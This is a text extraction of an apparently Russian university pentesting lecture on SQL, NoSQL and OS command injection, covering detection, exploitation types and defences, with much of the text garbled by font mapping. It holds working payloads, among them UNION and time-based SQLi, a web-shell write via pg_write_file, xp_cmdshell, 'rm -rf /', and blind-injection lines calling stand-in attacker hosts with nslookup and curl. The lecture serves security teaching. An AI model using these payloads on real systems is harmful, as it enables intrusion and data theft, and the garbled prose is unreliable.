{"path":"3 - Disciplines/Pentest/Files/Pentest-4-Server-vuln-p1.pdf","text":"Московскийhинститутhэлектроникиhиh математикиhимениhАvhНvhТихонова Кафедраhинформационнойh безопасностиhкиберфизическихh систем Москваhzxz} Лекцияh|‘h Серверныеhуязвимостиhвебuприложенийh Частьhy‘hSQLithNoSQLithOShcmdhinj Курс‘hТехнологииhпентестингаh Автор‘hКосмачевhАлексейhАлексеевичh yv SQLhinjectionh zv NoSQLhinjectionh {v OShCommandhinjection Планhлекции z ПланhлекцииКафедраhинформационнойh безопасностиhкиберфизическихh систем Лекцияh|‘hСерверныеhуязвимостиh вебuприложенийvhЧастьhy { Этапыhпроведенияhтестированияhнаh проникновение Кафедраhинформационнойh безопасностиhкиберфизическихh систем Лекцияh|‘hСерверныеhуязвимостиh вебuприложенийvhЧастьhy 1. Разведка 2. Сбор информации 3. Поиск уязвимостей 4. «Пробив» периметра 5. Закрепление 6. Повышение привилегий 7. Внутренняя разведка 8. Боковое перемещение 9. Реализация критического события SQLuинъекция | SQLuинъекцияКафедраhинформационнойh безопасностиhкиберфизическихh систем Лекцияh|‘hСерверныеhуязвимостиh вебuприложенийvhЧастьhy } SQLuинъекцияКафедраhинформационнойh безопасностиhкиберфизическихh систем Лекцияh|‘hСерверныеhуязвимостиh вебuприложенийvhЧастьhy Определение SELECThusernamehFROMhusershWHEREhpasswordh=h‘y’hORhy=yuu‘’ • SQL-инъекция (SQLi) —hэтоhуязвимостьhвебu безопасностиthкотораяhпозволяетhзлоумышленникуh вмешиватьсяhвhзапросыthкоторыеhприложениеh отправляетhкhсвоейhбазеhданныхvhЭтоhможетh позволитьhзлоумышленникуhпросматриватьhданныеth которыеhонhобычноhнеhможетhполучитьvhКhнимhмогутh относитьсяhданныеhдругихhпользователейhилиh любыеhдругиеhданныеthкhкоторымhприложениеh имеетhдоступvhВоhмногихhслучаяхhзлоумышленникh можетhизменитьhилиhудалитьhэтиhданныеthчтоh приводитhкhпостояннымhизменениямhвhсодержимомh илиhповеденииhприложенияv https‘wwexamplevcomwgetuuser?p=y’hORhy=yuu ~ SQLuинъекцияКафедраhинформационнойh безопасностиhкиберфизическихh систем Лекцияh|‘hСерверныеhуязвимостиh вебuприложенийvhЧастьhy Важныеhмоменты https‘wwtib{riusvcomwsqli « SQLuинъекцияКафедраhинформационнойh безопасностиhкиберфизическихh систем Лекцияh|‘hСерверныеhуязвимостиh вебuприложенийvhЧастьhy Важныеhмоменты SQLmap » SQLuинъекцияКафедраhинформационнойh безопасностиhкиберфизическихh систем Лекцияh|‘hСерверныеhуязвимостиh вебuприложенийvhЧастьhy Какhэтоhможетhвыглядетьhвhисходномhкоде <?php $username = $_POST['username']; $password = $_POST['password']; $query = \"SELECT * FROM users WHERE username = '$username' AND password = '$password'\"; $result = mysqli_query($conn, $query); ?> import sqlite3 username = input(\"Enter username: \") conn = sqlite3.connect('example.db') cursor = conn.cursor() query = f\"SELECT * FROM users WHERE username = '{username}'\" cursor.execute(query) — SQLuинъекцияКафедраhинформационнойh безопасностиhкиберфизическихh систем Лекцияh|‘hСерверныеhуязвимостиh вебuприложенийvhЧастьhy Возможноеhвлияние • ЧтениеhчувствительнойhинформацииhизhбазыhданныхhpБДqh • ЗаписьhинформацииhвhБДh • Изменениеhлогикиhработыhприложенияh • Чтениеwзаписьhсистемныхhфайловh • УдаленноеhисполнениеhкодаhpRCEq yx SQLuинъекцияКафедраhинформационнойh безопасностиhкиберфизическихh систем Лекцияh|‘hСерверныеhуязвимостиh вебuприложенийvhЧастьhy Этапыhэксплуатации yv Детектированиеh zv ОпределениеhтипаhSQLih {v ПолучениеhинформацииhоhСУБДhиhиспользуемомhSQLuзапросеh |vyvhПопыткаhисполненияhкодаhwhчтенияwзаписиhфайловh |vzvhПопыткаhизмененияhлогикиhприложенияh |v{vhРазведкаhБДhu>hПолучениеhwhзаписьhданных yy SQLuинъекцияКафедраhинформационнойh безопасностиhкиберфизическихh систем Лекцияh|‘hСерверныеhуязвимостиh вебuприложенийvhЧастьhy Детектированиеhчернымhящиком Ищемhпотенциальныеhместаhинъекцийhpпараметрыhзапросаqth Затем‘h • Добавляемhсимволыh‘th‘’thqhвhразныхhкомбинацияхhиhсмотримh наhошибкиhиhаномалииh • ВставляемhконструкцииhSQLuсинтаксисаhиhсравниваемhсh ожидаемымhповедениемh • ВставляемhлогическиеhконструкцииhORhy=yhиhORhy=zhиh сравниваемhответыh • Используемhtimeubasedhнагрузкиh • Используемhoutuofuboundhнагрузки Почемуhопасноhиспользоватьhнагрузкиhвидаh‘ORhy=yuu? yz SQLuинъекцияКафедраhинформационнойh безопасностиhкиберфизическихh систем Лекцияh|‘hСерверныеhуязвимостиh вебuприложенийvhЧастьhy pОсобенноhприhтестированииhчернымhящикомhнаhпродеq yv hh zv hh {v Почемуhопасноhиспользоватьhнагрузкиhвидаh‘ORhy=yuu? y{ SQLuинъекцияКафедраhинформационнойh безопасностиhкиберфизическихh систем Лекцияh|‘hСерверныеhуязвимостиh вебuприложенийvhЧастьhy pОсобенноhприhтестированииhчернымhящикомhнаhпродеq yv hПопадаетhвhINSERThилиhDELETEhuhрушимhБДhзаказчикаh zv hПопадаетhвhбольшойhSELECThuhDoShизuзаhбольшогоhколичестваhданныхh {v hЕслиhприложениеhожидаетhyhстрокуhuhполучаемhFalsehNegative y| SQLuинъекцияКафедраhинформационнойh безопасностиhкиберфизическихh систем Лекцияh|‘hСерверныеhуязвимостиh вебuприложенийvhЧастьhy БезопасныеhORhy=yhконструкции https‘wwtib{riusvcomwsqli y} SQLuинъекцияКафедраhинформационнойh безопасностиhкиберфизическихh систем Лекцияh|‘hСерверныеhуязвимостиh вебuприложенийvhЧастьhy МестаhинъекцийhвhSQLuзапросеhpнаиболееhчастыеq SELECT id FROM users WHERE username = ‘admin’ AND password = ‘admin’; y~ SQLuинъекцияКафедраhинформационнойh безопасностиhкиберфизическихh систем Лекцияh|‘hСерверныеhуязвимостиh вебuприложенийvhЧастьhy МестаhинъекцийhвhSQLuзапросеhpменееhчастыеq UPDATE users SET email = 'new.email@example.com' WHERE id = 105; INSERT INTO orders (customer_id, order_date, amount) VALUES ( (SELECT id FROM customers WHERE email = 'ivan.petrov@mail.ru'), CURRENT_DATE, 5000 ); y« SQLuинъекцияКафедраhинформационнойh безопасностиhкиберфизическихh систем Лекцияh|‘hСерверныеhуязвимостиh вебuприложенийvhЧастьhy МестаhинъекцийhвhSQLuзапросеhpменееhчастыеq SELECT id, name, (SELECT CASE WHEN EXTRACT(HOUR FROM CURRENT_TIME) < 12 THEN 'morning' ELSE 'evening' END) AS time_period FROM users; SELECT * FROM employees ORDER BY last_name; y» SQLuинъекцияКафедраhинформационнойh безопасностиhкиберфизическихh систем Лекцияh|‘hСерверныеhуязвимостиh вебuприложенийvhЧастьhy Разновидности • Errorubasedh • Booleanubasedh • UNIONubasedh • Timeubasedh • Blindh • StackedhQueriesh • OutuofuBoundh • SecondhOrder y— SQLuинъекцияКафедраhинформационнойh безопасностиhкиберфизическихh систем Лекцияh|‘hСерверныеhуязвимостиh вебuприложенийvhЧастьhy ErroruBasedhSQLuinjection • ПриложениеhвозвращаетhлогhошибокhSQLhвhответеhpStackTraceqh • Мыhвидимhвыводh • Дляhэксплуатацииhнужноhзаставитьhприложениеhвернутьhошибкуth содержащуюhнеобходимыеhданные zx SQLuинъекцияКафедраhинформационнойh безопасностиhкиберфизическихh систем Лекцияh|‘hСерверныеhуязвимостиh вебuприложенийvhЧастьhy ErroruBasedhSQLuinjection GET /page?id=1' AND 1=CAST((SELECT name FROM user LIMIT 1) AS int)-- HTTP/1.1 Host: example.com HTTP/1.1 500 Internal Server Error …. ERROR: invalid input syntax for type integer: \"admin\" … zy SQLuинъекцияКафедраhинформационнойh безопасностиhкиберфизическихh систем Лекцияh|‘hСерверныеhуязвимостиh вебuприложенийvhЧастьhy BooleanuBasedhSQLuinjection • ОперированиеhлогическимиhоператорамиhSQLh • Можетhбытьhсоставнойhчастьюhдругихhтиповh • Какhсамостоятельныйhтипhиспользуетсяhдляhвлиянияhнаhлогикуhиh обходаhавторизации zz SQLuинъекцияКафедраhинформационнойh безопасностиhкиберфизическихh систем Лекцияh|‘hСерверныеhуязвимостиh вебuприложенийvhЧастьhy BooleanuBasedhSQLuinjection POST /login.php HTTP/1.1 Host: example.com … username=admin’--&password=anything HTTP/1.1 302 Found Set-Cookie: … Location: https://example.com/profile.php z{ SQLuинъекцияКафедраhинформационнойh безопасностиhкиберфизическихh систем Лекцияh|‘hСерверныеhуязвимостиh вебuприложенийvhЧастьhy UNIONuBasedhSQLuinjection • ИспользуемhUNIONuконструкцииhвhнагрузкеthчтобыhполучатьhданныеh изhдругихhтаблицhпутемhобъединенияhсhисходнымhзапросомh • ВозможноthеслиhисходныйhSQLhзапросhuhSELECTh • Являетсяhлучшимhспособомhдоставатьhданныеthтvкvhданныеh получаютсяhвhчистомhвидеhбезhсложныхhконструкцийh • ЕдинственнаяhсложностьhuhколичествоhстолбоцовhвhUNIONuзапросеh должноhсовпадатьhсhисходным z| SQLuинъекцияКафедраhинформационнойh безопасностиhкиберфизическихh систем Лекцияh|‘hСерверныеhуязвимостиh вебuприложенийvhЧастьhy UNIONuBasedhSQLuinjection Путьhэксплуатацииhpпослеhпредварительныхhэтаповq‘h yv Определитьhколичествоhстолбцов‘h ‘hUNIONhSELECThNULLuuhhhhhhhhhhh‘hUNIONhSELECThNULLtNULLuuhhhhhhhhhhh‘hUNIONhSELECThNULLtNULLtNULLuuh ‘hORDERhBYhyuuhhhhhhhhhhhhhhhhhhhhhhhhhhh‘hORDERhBYhzuuhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh‘hORDERhBYh{uuh zv Определитьhстолбецthкоторыйhвозвращаетсяhвhответеhприложенияhиhопределитьhегоhтипhданных‘h ‘hUNIONhSELECTh‘asd’tNULLuuhhhhhhhhhhh‘hUNIONhSELECThNULLt’asd’uuh {v Определитьthкакиеhтаблицыhpinformation_schemavtablesqhиhстолбцыhpinformation_schemavcolumnsqh естьhвhБДh |v Достатьhнеобходимыеhзначенияh }v Бонусhuhможноhиспользоватьhконкатенациюhиhвыводитьhнесколькоhстолбцов‘h ‘hUNIONhSELECThNULLthusernamehsh||h‘~’h||hshpasswordhFROMhusersuuh z} SQLuинъекцияКафедраhинформационнойh безопасностиhкиберфизическихh систем Лекцияh|‘hСерверныеhуязвимостиh вебuприложенийvhЧастьhy UNIONuBasedhSQLuinjection GET /orders?type=1' UNION SELECT username || '~' || password FROM users-- HTTP/1.1 Host: example.com HTTP/1.1 200 OK … { {\"wood\", \"admin~1234\"}, {\"wood\", \"user~4321\"}, } z~ SQLuинъекцияКафедраhинформационнойh безопасностиhкиберфизическихh систем Лекцияh|‘hСерверныеhуязвимостиh вебuприложенийvhЧастьhy TimeuBasedhSQLuinjection • Происходитhвызовhвременныхhзадержекhвhзависимостиhотhистинностиh некоторогоhусловияh • Обычноhданныеhдостаютсяhпосимвольноh • КрайнеhзатратныйhпоhвремениhметодvhСтоитhиспользоватьhтолькоhеслиh большеhничегоhнеhработаетhh • Бинарныйhпоискhиhмногопоточностьhмогутhхотьhкакuтоhспастиhситуациюh • Кhданномуhтипуhможноhсвестиhпочтиhлюбойhдругойhтипhpвhкакихhслучаяхh нельзя?q z« SQLuинъекцияКафедраhинформационнойh безопасностиhкиберфизическихh систем Лекцияh|‘hСерверныеhуязвимостиh вебuприложенийvhЧастьhy TimeuBasedhSQLuinjection GET /page?id=1';SELECT CASE WHEN (username='admin' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users-- HTTP/1.1 Host: example.com yxhuhсекунднаяhзадержкаhвhответеthеслиhусловиеhистинно задержкиhнетthеслиhусловиеhложно z» SQLuинъекцияКафедраhинформационнойh безопасностиhкиберфизическихh систем Лекцияh|‘hСерверныеhуязвимостиh вебuприложенийvhЧастьhy BlindhSQLuinjection • Приложениеhнеhвозвращаетhвыводаhвнеhзависимостиhотh поставляемыхhданныхh • Изhповеденияhприложенияhможноhоднозначноhсказатьthистинноhилиh ложноhSQLuусловиеthкотороеhотправляетhатакующийh • Какhсамостоятельныйhтипhможетhсуществоватьhеслиhприложениеh содержитhкакиеuтоhдопvhсимволыwзаголовкиh • Оченьhчастоhвключаетhвhсебяhдругиеhтипыhкакhподвидыthнапримерh timeubasedtherrorubasedhpкодhответаqh Примечание‘hприhнаименованииhтипаhуязвимостиthеслиhуязвимостьh «слепая»thтоhданнаяhхарактеристикаhбудетhдоминирующей z— SQLuинъекцияКафедраhинформационнойh безопасностиhкиберфизическихh систем Лекцияh|‘hСерверныеhуязвимостиh вебuприложенийvhЧастьhy BlindhSQLuinjection GET /page?id=1';SELECT CASE WHEN (username='admin' AND SUBSTRING(password,1,1)='a') THEN 1/0 ELSE NULL END FROM users-- HTTP/1.1 Host: example.com Кодhответаh}xxthеслиhусловиеhистинноhpделениеhнаhxq Кодhответаhzxxthеслиhусловиеhложно {x SQLuинъекцияКафедраhинформационнойh безопасностиhкиберфизическихh систем Лекцияh|‘hСерверныеhуязвимостиh вебuприложенийvhЧастьhy StackedhQueries • Эксплуатацияhпостроенаhнаhвнедренииhвторогоhpпроизвольногоqh SQLuзапросаhпослеhоригинальногоh • ПозволяетhвстроитьhзапросhдругогоhтипаhpнапрvhUPDATEhпослеh SELECTqh • Обычноhрезультатhвторогоhзапросаhнеhбудетhвозвращенh • ЧастоhиспользуетсяhдляhRCEuвекторовh • МожноhиспользоватьhдляhBlindhSQLi {y SQLuинъекцияКафедраhинформационнойh безопасностиhкиберфизическихh систем Лекцияh|‘hСерверныеhуязвимостиh вебuприложенийvhЧастьhy OutuofuBoundhSQLuinjection • SQLuзапросhинициируетhобращениеhпоhсетиhкhподконтрольномуh серверуh • Можноhиспользоватьhкакhblinduтехникуhилиhизвлекатьhданныеh напрямуюh • Частоhнеhбудетhработатьhвhсовременныхhприложенияхhpпочему?qh • Еслиhработаетthтоhможетhспастиhкогдаhtimeubasedhиhпрочиеhтипыhнеh работают {z SQLuинъекцияКафедраhинформационнойh безопасностиhкиберфизическихh систем Лекцияh|‘hСерверныеhуязвимостиh вебuприложенийvhЧастьhy OutuofuBoundhSQLuinjection GET /page?id=1';SELECT 1337 INTO OUTFILE ‘\\\\\\\\attacker.domain\\a’-- HTTP/1.1 Host: example.com Получаемhотстукhнаhсвойhдомен {{ SQLuинъекцияКафедраhинформационнойh безопасностиhкиберфизическихh систем Лекцияh|‘hСерверныеhуязвимостиh вебuприложенийvhЧастьhy SecondhOrderhSQLuinjection • ИнъекцияhвhSQLuзапросhпроисходитhнеhнапрямуюthаhпослеhтогоthкакh данныеhбылиhужеhвнедреныhзаранееh • ИнымиhсловамиthсначалаhнагрузкаhсохраняетсяhгдеuтоhвhБДhоднимh запросомthаhзатемthпоследующимиhзапросамиhвставляетсяhвhуязвимыйh SQLuзапросh • Типhэксплуатацииhсамойhнагрузкиhможетhбытьhлюбойhизhупомянутыхh ранееh • Сложнееhавтоматизироватьh • Практическиhнеhдетектируетсяhсканерами {| SQLuинъекцияКафедраhинформационнойh безопасностиhкиберфизическихh систем Лекцияh|‘hСерверныеhуязвимостиh вебuприложенийvhЧастьhy SQLihCheatsheets • https‘wwportswiggervnetwwebusecuritywsqluinjectionwcheatusheeth • https‘wwtib{riusvcomwsqlih {} SQLuинъекцияКафедраhинформационнойh безопасностиhкиберфизическихh систем Лекцияh|‘hСерверныеhуязвимостиh вебuприложенийvhЧастьhy RCEhвhSQLuинъекции ДляhкаждойhСУБДhдолжныhсоблюдатьсяhсвоиhусловияthнапример‘h • Еслиhязыкhприложенияhphpwjspwподобныеhuhможноhзаписатьh вебuшеллhвhфайлhнаhсистеме '; SELECT pg_write_file('/var/www/html/shell.php', '<SHELL>', false);-- {~ SQLuинъекцияКафедраhинформационнойh безопасностиhкиберфизическихh систем Лекцияh|‘hСерверныеhуязвимостиh вебuприложенийvhЧастьhy RCEhвhSQLuинъекции ДляhкаждойhСУБДhдолжныhсоблюдатьсяhсвоиhусловияthнапример‘h • ВhMSSQLhдолженhприсутствоватьhxp_cmdshellhиhбытьh соответствующиеhправаhpилиhегоhальтернативыq EXEC xp_cmdshell 'whoami'; {« SQLuинъекцияКафедраhинформационнойh безопасностиhкиберфизическихh систем Лекцияh|‘hСерверныеhуязвимостиh вебuприложенийvhЧастьhy RCEhвhSQLuинъекции ДляhкаждойhСУБДhдолжныhсоблюдатьсяhсвоиhусловияthнапример‘h • ВhСУБДhOraclehможноhсоздатьhиhвызватьhJAVAuпроцедуру CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED \"OSCommand\" AS import java.lang.*; import java.io.*; public class OSCommand { public static void executeCommand(String command) throws IOException { Runtime.getRuntime().exec(command); } }; {» SQLuинъекцияКафедраhинформационнойh безопасностиhкиберфизическихh систем Лекцияh|‘hСерверныеhуязвимостиh вебuприложенийvhЧастьhy RCEhвhSQLuинъекции ДляhкаждойhСУБДhдолжныhсоблюдатьсяhсвоиhусловияthнапример‘h • ВhPostgreSQLhестьhнесколькоhспособов‘h yvhИспользоватьhCOPYhTOwFROMhPROGRAM '; DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'id'; -- hhhzvhUseruDefinedhFunctionshpUDFqhpпишемhфункциюhнаhCthкомпилируемhиhгрузимhвhPostgresq CREATE OR REPLACE FUNCTION test(text) RETURNS void AS 'FILENAME', 'test' LANGUAGE 'C' STRICT; hh{vhLargehObjectshpпринципhпохожhнаhпредыдущийthноhиспользуютсяhструктурыhбольшихhобъектовvh Сложность‘hнужноhпередаватьhфайлhчастямиhиhзнатьwуказатьhидентификаторhобъектаq INSERT INTO PG_LARGEOBJECT (loid, pageno, data) VALUES (%d, %d, decode(\"%s\", <DATA>)) {— SQLuинъекцияКафедраhинформационнойh безопасностиhкиберфизическихh систем Лекцияh|‘hСерверныеhуязвимостиh вебuприложенийvhЧастьhy Защита • Санитизацияhnhвалидацияhуправляющихhсимволовh • Строгоеhприведениеhтиповh • Prepared Statements pоднакоthможетhработаьбhнеhдляhвсехhчастейh запросаthнапрthназванияhтаблицwстолбцовthORDERhBYq • ORM cursor.execute(\"SELECT * FROM users WHERE id = ?\", (user_id,)) session.query(User).filter(User.email == \"aa@example.com\").first() NoSQLuинъекция |x NoSQLuинъекцияКафедраhинформационнойh безопасностиhкиберфизическихh систем Лекцияh|‘hСерверныеhуязвимостиh вебuприложенийvhЧастьhy |y NoSQLuинъекцияКафедраhинформационнойh безопасностиhкиберфизическихh систем Лекцияh|‘hСерверныеhуязвимостиh вебuприложенийvhЧастьhy Определение dbvusersvfindp{husername‘hjadminjthpassword‘h{hlne‘hjinvalidjh}h}q • NoSQL-инъекцияh—hэтоhуязвимостьthсhпомощьюh которойhзлоумышленникhможетhвмешатьсяhвh запросыthкоторыеhприложениеhделаетhкhбазеh данныхhNoSQLv https‘wwexamplevcomwgetuuser?username=adminnpassword[lne]=invalid |z NoSQLuинъекцияКафедраhинформационнойh безопасностиhкиберфизическихh систем Лекцияh|‘hСерверныеhуязвимостиh вебuприложенийvhЧастьhy Какhэтоhможетhвыглядетьhвhисходномhкоде <?php $manager = new MongoDB\\Driver\\Manager(\"mongodb://localhost:27017\"); $username = $_POST['username']; $password = $_POST['password']; $filter = ['username' => $username, 'password' => $password]; $query = new MongoDB\\Driver\\Query($filter); $result = $manager->executeQuery('db.users', $query); ?> @Query(\"{ 'username' : ?0, 'password' : ?1 }\") User findByCredentials(String username, String password); @PostMapping(\"/login\") public String login(String username, String password) { User user = userRepo.findByCredentials(username, password); return user != null ? \"Logged in\" : \"Failed\"; } |{ NoSQLuинъекцияКафедраhинформационнойh безопасностиhкиберфизическихh систем Лекцияh|‘hСерверныеhуязвимостиh вебuприложенийvhЧастьhy Возможноеhвлияние • Обходhавторизацииh • Чтениеhwhизменениеhданныхh • ОтказhвhобслуживанииhpDoSqh • ВыполнениеhкодаhpRCEq || NoSQLuинъекцияКафедраhинформационнойh безопасностиhкиберфизическихh систем Лекцияh|‘hСерверныеhуязвимостиh вебuприложенийvhЧастьhy ОтличияhотhSQLuинъекции yv ИспользуютсяhNoSQLhСУБДhpочевидноhизhназванияqh zv НетhуниверсальногоhстандартаhuhсильноhзависитhотhСУБДhиh языкаhприложенияh {v Существуетhинъекцияhоператоровhpнеhтолькоhсинтаксисаqh |v НекоторыеhNoSQLhСУБДhпозволяютhисполнениеhJS |} NoSQLuинъекцияКафедраhинформационнойh безопасностиhкиберфизическихh систем Лекцияh|‘hСерверныеhуязвимостиh вебuприложенийvhЧастьhy Разновидности • Syntaxhinjectionh • Operatorhinjection |~ NoSQLuинъекцияКафедраhинформационнойh безопасностиhкиберфизическихh систем Лекцияh|‘hСерверныеhуязвимостиh вебuприложенийvhЧастьhy Syntaxhinjection • ПроисходитthкогдаhвозможноhнарушитьhсинтаксисhNoSQLuзапросаth чтоhпозволяетhвнедритьhсобственнуюhполезнуюhнагрузкуvh МетодологияhаналогичнаhиспользуемойhприhSQLuинъекцииvhОднакоh характерhатакиhсущественноhразличаетсяthпосколькуhбазыhданныхh NoSQLhиспользуютhразличныеhязыкиhзапросовthтипыhсинтаксисаh запросовhиhразличныеhструктурыhданныхv |« NoSQLuинъекцияКафедраhинформационнойh безопасностиhкиберфизическихh систем Лекцияh|‘hСерверныеhуязвимостиh вебuприложенийvhЧастьhy Syntaxhinjectionhuhобнаружение yv Fuzzupayload‘h '\"`{ ;$Foo} $Foo \\xYZ zvhИнъекцияhспецvhсимволовhиhпоискhаномалийh {vhПроверкаhусловногоhповедения‘h hhhhhhhhhhhhhhhhhhhhhhohnnhxhnnhoxhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhohnnhyhnnh‘xh |vhИнъекцияhвhлогическиеhоператоры‘h hhhhhhhhhhhhhhhhhhhhhho||oyo==oyhhhhhhhhhhhhhhhhhhpАналогh‘ORhy=yuuthиспользовать с осторожностьюqh }vhNulluсимволыhpmxxth\\xth\\uxxxxqhмогутhвосприниматьсяhкакhтерминаторыhстрокиhpкомментарииq |» NoSQLuинъекцияКафедраhинформационнойh безопасностиhкиберфизическихh систем Лекцияh|‘hСерверныеhуязвимостиh вебuприложенийvhЧастьhy Syntaxhinjectionhuhэксплуатация yv Посимвольныйhпереборhзначения‘h hhhhhhhhhhhhhhhhhhhhhhhh Местоhинъекции‘ {\"$where\":\"this.username == '<query>'\"} ' && this.password[0] == 'a' || ‘a'=='b zvhСоответствиеhрегулярномуhвыражению‘h hhhhhhhhhhhhhhhhhhhhhhhh ' && this.password.match(/\\d/) || 'a'=='b {vh«Угадывание»hназванийhполейhpразличияhвhответахq ' && this.username!=' ' && this.foo!=' |— NoSQLuинъекцияКафедраhинформационнойh безопасностиhкиберфизическихh систем Лекцияh|‘hСерверныеhуязвимостиh вебuприложенийvhЧастьhy Operatorhinjection • Происходитthкогдаhвозможноhиспользоватьhоператорыhзапросовh NoSQLhдляhманипуляцииhзапросамиvh ПримерыhоператоровhMongoDB‘ Оператор Значение lwhere Соответствуетhдокументамthудовлетворяющимh выражениюhJavaScript lne Соответствуетhвсемhзначениямthнеhравнымhуказанномуh значению lin Соответствуетhвсемhзначениямthуказаннымhвhмассивеv lregex Выбираетhдокументыthзначенияhкоторыхhсоответствуютh указанномуhрегулярномуhвыражениюv }x NoSQLuинъекцияКафедраhинформационнойh безопасностиhкиберфизическихh систем Лекцияh|‘hСерверныеhуязвимостиh вебuприложенийvhЧастьhy Operatorhinjectionhuhместаhинъекцийhиhдетектирование yv GETuзапрос‘h GET /login?username[$ne]=invalid HTTP/1.1 Host: example.com zvhPOSTuзапрос POST /login HTTP/1.1 Host: example.com Content-Type: application/json {\"username\":{\"$in\":[\"admin\",\"administrator\",\"user\"]},\"password\":{\"$ne\":\"\"}} }y NoSQLuинъекцияКафедраhинформационнойh безопасностиhкиберфизическихh систем Лекцияh|‘hСерверныеhуязвимостиh вебuприложенийvhЧастьhy Operatorhinjectionhuhдетектированиеhиhэксплуатация yv Booleanubased‘hhhhhhhhhhhhhhhhhhhhhh {\"username\":\"admin\",\"password\":\"1234\", \"$where\":\"0\"} {\"username\":\"admin\",\"password\":\"1234\", \"$where\":\"1\"} zvhПосимвольноеhизвлечениеhназванияhполейhpрегулярноеhвыражениеq‘hhhhhhhhhhhhhhhh \"$where\":\"Object.keys(this)[0].match('^.{0}a.*')\" {vhПосимвольноеhизвлечениеhзначенийhpрегулярноеhвыражениеq‘hhhhhhhhhhhhhhhh {\"username\":\"admin\",\"password\":{\"$regex\":\"^a*\"}} }z NoSQLuинъекцияКафедраhинформационнойh безопасностиhкиберфизическихh систем Лекцияh|‘hСерверныеhуязвимостиh вебuприложенийvhЧастьhy TimeuBasedhэксплуатация yv Вызовhзадержки‘hhhhhhhhhhhhhhhhhhhhhh {\"$where\": \"sleep(5000)\"} zvhУсловнаяhзадержка‘hhhhhhhhhhhhhhhh '+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]===\"a\") && waitTill > new Date()){};}(this)+' '+function(x){if(x.password[0]===\"a\"){sleep(5000)};}(this)+' }{ NoSQLuинъекцияКафедраhинформационнойh безопасностиhкиберфизическихh систем Лекцияh|‘hСерверныеhуязвимостиh вебuприложенийvhЧастьhy Защита • Санитизацияhnhвалидацияhвводаh • Белыйhсписокhразрешенныхhсимволовh • Использованиеhпараметризированныхhзапросовh • Белыйhсписокhразрешенныхhключейhpотhинъекцииhоператоровqh • Конкретные меры защиты зависят от конкретной NoSQL СУБД OShcommandhinjection }| OShcommandhinjectionКафедраhинформационнойh безопасностиhкиберфизическихh систем Лекцияh|‘hСерверныеhуязвимостиh вебuприложенийvhЧастьhy }} OShcommandhinjectionКафедраhинформационнойh безопасностиhкиберфизическихh систем Лекцияh|‘hСерверныеhуязвимостиh вебuприложенийvhЧастьhy Определение pinghuch|h»v»v»v»’hrmhurfhw • OS command injection позволяетhзлоумышленникуh выполнятьhкомандыhоперационнойhсистемыhpОСqh наhсервереthнаhкоторомhзапущеноhприложениеthиth какhправилоthполностьюhскомпрометироватьh приложениеhиhегоhданныеv http‘wwexamplevcomwpingvphp?ip=»v»v»v»’srmsurfsw }~ OShcommandhinjectionКафедраhинформационнойh безопасностиhкиберфизическихh систем Лекцияh|‘hСерверныеhуязвимостиh вебuприложенийvhЧастьhy Какhэтоhможетhвыглядетьhвhисходномhкоде <?php $user_ip = $_GET['ip']; exec(\"ping -c 4 \" . $user_ip); ?> import os user_input = input(\"Enter a filename: \") os.system(f\"cat {user_input}\") const { exec } = require('child_process'); const user_input = req.query.filename; exec(`ls -l ${user_input}`, (err, stdout) => {}); }« OShcommandhinjectionКафедраhинформационнойh безопасностиhкиберфизическихh систем Лекцияh|‘hСерверныеhуязвимостиh вебuприложенийvhЧастьhy Разновидности • Видимаяh • СлепаяhpBlindq }» OShcommandhinjectionКафедраhинформационнойh безопасностиhкиберфизическихh систем Лекцияh|‘hСерверныеhуязвимостиh вебuприложенийvhЧастьhy Символыhдляhвнедренияhкоманд nh nnh |h ||h ’h xxxah \\nh `INJECTED_COMMAND`h lpINJECTED_COMMANDq }— OShcommandhinjectionКафедраhинформационнойh безопасностиhкиберфизическихh систем Лекцияh|‘hСерверныеhуязвимостиh вебuприложенийvhЧастьhy ВидимаяhOShcommandhinjectionh • Выводhотображаетсяhвhвозвращаемомhответеh • Простаяhэксплуатацияthноhнеhвсегдаhочевидныеhместаhвнедрения http‘wwexamplevcomworder?src=yndst={ . /vieworder.sh 1 3 http‘wwexamplevcomworder?src=nhechohpwnedhnndst={ . /vieworder.sh & echo pwned & 3 Error - src was not provided pwned 3: command not found ~x OShcommandhinjectionКафедраhинформационнойh безопасностиhкиберфизическихh систем Лекцияh|‘hСерверныеhуязвимостиh вебuприложенийvhЧастьhy BlindhOShcommandhinjectionh • Выводhнеhотображаетсяhвhвозвращаемомhответеh • Сложнееhдетектироватьthноhтакжеhпростаяhэксплуатация ~y OShcommandhinjectionКафедраhинформационнойh безопасностиhкиберфизическихh систем Лекцияh|‘hСерверныеhуязвимостиh вебuприложенийvhЧастьhy BlindhOShcommandhinjectionhuhобнаружение yv Вызовhвременнойhзадержки‘hhhhhhhhhhhhhhhhhhhh & ping -c 10 127.0.0.1 & & sleep 10 & zvhПеренаправлениеhвывода‘ & whoami > /var/www/static/whoami.txt & {vhВнешняяhкоммуникация‘ & nslookup tst.attacker.com & & nslookup `whoami`.tst.attacker.com & & curl tst.attacker.com & ~z OShcommandhinjectionКафедраhинформационнойh безопасностиhкиберфизическихh систем Лекцияh|‘hСерверныеhуязвимостиh вебuприложенийvhЧастьhy Первичнаяhразведкаhхоста Получаемаяhинформация Linux Windows Имяhпользователя whoami whoami Операционнаяhсистема unamehua ver Сетеваяhконфигурация ifconfig ipconfighwall Сетевыеhсоединения netstathuan netstathuan Запущенныеhпроцессы pshuef tasklist Однако: любая из данных команд позволяет обнаружить присутствие атакующего ~{ OShcommandhinjectionКафедраhинформационнойh безопасностиhкиберфизическихh систем Лекцияh|‘hСерверныеhуязвимостиh вебuприложенийvhЧастьhy Защита • Белыйhсписокhразрешенныхhсимволовh • Валидацияthчтоhвводhпользователяhявляетсяhчисломh • Валидацияhчтоhвводhпользователяhhсодержитhтолькоhбуквыhиhцифрыh • Не позволять пользовательскому вводу достигать мест исполнения команд ОС ~| ФиналКафедраhинформационнойh безопасностиhкиберфизическихh систем Лекцияh|‘hСерверныеhуязвимостиh вебuприложенийvhЧастьhy","libVersion":"0.5.0","langs":""}